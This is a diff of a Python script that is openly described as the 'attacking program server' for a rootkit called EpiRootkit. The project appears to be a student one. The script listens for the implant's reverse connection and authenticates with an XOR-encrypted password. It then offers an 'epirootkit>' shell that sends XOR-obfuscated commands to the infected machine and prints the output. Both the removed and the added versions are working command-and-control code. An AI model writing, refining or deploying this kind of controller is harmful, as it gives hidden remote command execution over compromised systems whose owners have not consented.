@@ -1,163 +1,157 @@
+import argparse
 import socket
+import logging
 import sys
-import time
-import binascii
 
-DEBUG = True
-KEY = "epirootkit"
-HOST = "0.0.0.0"
-PORT = 4242
+# Encryption key must match the rootkit's key (1-byte XOR key).
+XOR_KEY = 0x2A
 
-def debug_hexdump(prefix, data):
-    if DEBUG:
-        hex_dump = ' '.join(f'{b:02x}' for b in data)
-        ascii_dump = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in data)
-        print(f"[DEBUG] {prefix}:")
-        print(f"[DEBUG] Hex:   {hex_dump}")
-        print(f"[DEBUG] ASCII: {ascii_dump}")
+def xor_encrypt_decrypt(data: bytes) -> bytes:
+    """XOR encrypt/decrypt the given byte array with the shared key."""
+    return bytes(b ^ XOR_KEY for b in data)
 
-def xor_encrypt(data: bytes) -> bytes:
-    """
-    Implements XOR encryption using the key.
-    Each byte of input is XORed with the corresponding byte of the key (cycling if needed).
-    """
-    key_bytes = KEY.encode('ascii')
-    key_len = len(key_bytes)
-    result = bytearray()
-
-    # Debug the input
-    debug_hexdump("Input data", data)
-    debug_hexdump("Key", key_bytes)
-
-    # Perform XOR encryption/decryption
-    for i in range(len(data)):
-        key_byte = key_bytes[i % key_len]
-        result.append(data[i] ^ key_byte)
-
-    # Debug the output
-    debug_hexdump("Output data", result)
-    return bytes(result)
-
-def receive_until_eof(client, timeout=5):
-    """Receive data until --EOF-- marker is found or timeout occurs"""
-    client.settimeout(0.1)
-    start_time = time.time()
-    response = bytearray()
-
-    while time.time() - start_time < timeout:
+class EpiRootkitClient:
+    """Attacking program server for the EpiRootkit."""
+    def __init__(self, host: str, port: int, password: str, debug: bool = False):
+        self.host = host
+        self.port = port
+        self.password = password
+        # Initialize logging level
+        log_level = logging.DEBUG if debug else logging.INFO
+        logging.basicConfig(level=log_level, format='[%(levelname)s] %(message)s')
+        # Create a listening socket for incoming rootkit connection
+        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Reuse address to avoid TIME_WAIT issues on quick restarts
+        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
-            chunk = client.recv(2048)
-            if not chunk:
-                if response:  # If we already have some data, process it
-                    break
-                continue
+            self.server_socket.bind((self.host, self.port))
+        except socket.error as e:
+            logging.error(f"Failed to bind on {self.host}:{self.port} – {e}")
+            sys.exit(1)
+        self.server_socket.listen(1)
+        logging.info(f"Listening on {self.host}:{self.port} for rootkit connection...")
 
-            response.extend(chunk)
-            decrypted = xor_encrypt(response)
-            if b'--EOF--' in decrypted:
-                break
+    def start(self):
+        """Main loop to accept rootkit connections and handle sessions."""
+        try:
+            while True:
+                # Wait for the rootkit to connect
+                conn, addr = self.server_socket.accept()
+                logging.info(f"[*] Rootkit connected from {addr}")
+                try:
+                    # Perform authentication handshake
+                    authed = self._authenticate(conn)
+                except Exception as e:
+                    logging.error(f"Authentication error: {e}")
+                    conn.close()
+                    continue
 
+                if not authed:
+                    logging.warning("Authentication failed. Closing connection.")
+                    conn.close()
+                    continue
+                logging.info("[*] Authentication successful. Starting interactive session.")
+
+                # Handle interactive command session until disconnection or exit
+                try:
+                    self._handle_session(conn)
+                except Exception as e:
+                    logging.error(f"Session error: {e}")
+                finally:
+                    conn.close()
+                    logging.info("[*] Connection closed. Waiting for reconnection...")
+                    # Loop continues to accept the next connection (persistent retry by rootkit)
+        except KeyboardInterrupt:
+            logging.info("Server shutting down.")
+        finally:
+            self.server_socket.close()
+
+    def _authenticate(self, conn: socket.socket) -> bool:
+        """Exchange authentication with the rootkit. Returns True if successful."""
+        # Send the password (encrypted) as the first message
+        pw_bytes = self.password.encode('utf-8')
+        encrypted_pw = xor_encrypt_decrypt(pw_bytes)
+        conn.sendall(encrypted_pw)
+        logging.debug("Sent encrypted authentication password to rootkit.")
+
+        # Receive the rootkit's response (expected "OK" or "FAIL")
+        conn.settimeout(5.0)  # timeout to avoid hanging if no response
+        try:
+            data = conn.recv(1024)
         except socket.timeout:
-            if response:  # If we have data but hit timeout, process what we have
-                break
-            continue
-        except Exception as e:
-            print(f"Error receiving data: {e}")
-            break
+            logging.error("Authentication response timed out.")
+            return False
+        finally:
+            conn.settimeout(None)  # remove timeout for further operations
 
-    return bytes(response)
+        if not data:
+            logging.error("Rootkit closed connection during authentication.")
+            return False
 
-def handle_client(client):
-    try:
-        # Send encrypted password
-        password = b"epirootkit\n"
-        encrypted_pass = xor_encrypt(password)
-        print("[*] Sending authentication...")
-        client.sendall(encrypted_pass)
+        # Decrypt and decode the response
+        response = xor_encrypt_decrypt(data).decode('utf-8', errors='ignore').strip()
+        logging.debug(f"Received auth response: {response}")
+        return response == "OK"
 
-        # Receive and decrypt auth response
-        auth_response_encrypted = receive_until_eof(client)
-        if not auth_response_encrypted:
-            print("[-] No response received")
-            return
-
-        auth_response = xor_encrypt(auth_response_encrypted)
-        try:
-            auth_text = auth_response.decode('ascii', errors='ignore')
-            print("[+] Authentication response:")
-            print(auth_text.replace('--EOF--', '').strip())
-
-            if "FAIL" in auth_text:
-                print("[-] Authentication failed")
-                return
-
-        except UnicodeDecodeError:
-            print("[-] Received corrupted auth response")
-            return
-
-        print("[+] Successfully authenticated")
-        print("[*] Enter commands (type 'exit' to quit):")
-
-        # Interactive shell loop
+    def _handle_session(self, conn: socket.socket):
+        """Interactively handle commands for an established connection."""
+        # Use sys.stdout.write for prompt to avoid newline issues with print
         while True:
             try:
-                cmd = input("rootkit> ").strip()
-                if not cmd:
-                    continue
-                if cmd.lower() == "exit":
-                    print("[*] Sending exit command...")
-                    encrypted_cmd = xor_encrypt(b"exit\n")
-                    client.sendall(encrypted_cmd)
-                    break
-
-                # Send encrypted command
-                cmd_bytes = (cmd + "\n").encode('ascii')
-                encrypted_cmd = xor_encrypt(cmd_bytes)
-                client.sendall(encrypted_cmd)
-
-                # Receive and decrypt response
-                response_encrypted = receive_until_eof(client)
-                if response_encrypted:
-                    response = xor_encrypt(response_encrypted)
-                    try:
-                        response_text = response.decode('ascii', errors='ignore')
-                        output = response_text.replace('--EOF--', '').strip()
-                        if output:
-                            print(output)
-                    except UnicodeDecodeError:
-                        print("[-] Received corrupted response")
-
-            except KeyboardInterrupt:
-                print("\n[*] Sending exit command...")
-                encrypted_cmd = xor_encrypt(b"exit\n")
-                client.sendall(encrypted_cmd)
-                break
-            except Exception as e:
-                print(f"[-] Error during command execution: {e}")
+                cmd = input("epirootkit> ")
+            except EOFError:
+                # End of input (e.g., Ctrl+D)
+                logging.info("Input stream closed. Ending session.")
                 break
 
-    except Exception as e:
-        print(f"[-] Connection error: {e}")
+            if not cmd:
+                # Empty command entered; just reprompt
+                continue
 
-def main():
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
-        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        try:
-            server.bind((HOST, PORT))
-            server.listen(1)
-            print(f"[*] Waiting for connection on {HOST}:{PORT}...")
+            if cmd in ("exit", "quit"):
+                # Exit the session: instruct rootkit to disconnect
+                encrypted_cmd = xor_encrypt_decrypt(cmd.encode('utf-8'))
+                conn.sendall(encrypted_cmd)
+                logging.info("Sent exit command to rootkit. Closing session.")
+                break
 
+            # Send the command to the rootkit (encrypted)
+            encrypted_cmd = xor_encrypt_decrypt(cmd.encode('utf-8'))
+            conn.sendall(encrypted_cmd)
+            logging.debug(f"Sent command: {cmd}")
+
+            # Receive and display the output until the EOF marker is encountered
+            output_buffer = ""
             while True:
-                client, addr = server.accept()
-                print(f"[+] Connection from {addr[0]}:{addr[1]}")
-                client.settimeout(5)  # Set a default timeout
-                handle_client(client)
-                client.close()
+                data = conn.recv(4096)
+                if not data:
+                    # Connection lost unexpectedly
+                    logging.warning("Connection lost while receiving command output.")
+                    return  # exit the session handler to allow reconnect
+                # Decrypt the data chunk
+                chunk = xor_encrypt_decrypt(data)
+                # Decode to text (ignore any decoding errors to handle binary data safely)
+                text_chunk = chunk.decode('utf-8', errors='ignore')
+                # Check for the end-of-output marker
+                if "--EOF--" in text_chunk:
+                    # Append everything before the marker, then break
+                    before_eof, _ = text_chunk.split("--EOF--", 1)
+                    output_buffer += before_eof
+                    logging.debug("End-of-output marker received.")
+                    break
+                else:
+                    # No marker yet; accumulate output and continue receiving
+                    output_buffer += text_chunk
+                    continue
 
-        except KeyboardInterrupt:
-            print("\n[*] Shutting down server...")
-        except Exception as e:
-            print(f"[-] Server error: {e}")
+            # Print the accumulated output (if any)
+            if output_buffer:
+                # Using end="" to avoid adding extra newline as output likely contains its own newlines
+                print(output_buffer, end="")
+            else:
+                # If there's no output content, just print nothing (or could print a blank line if needed)
+                pass
 
-if __name__ == "__main__":
-    main()
+            # Clear the buffer for the next command
+            output_buffer = ""
+        # End of interactive loop
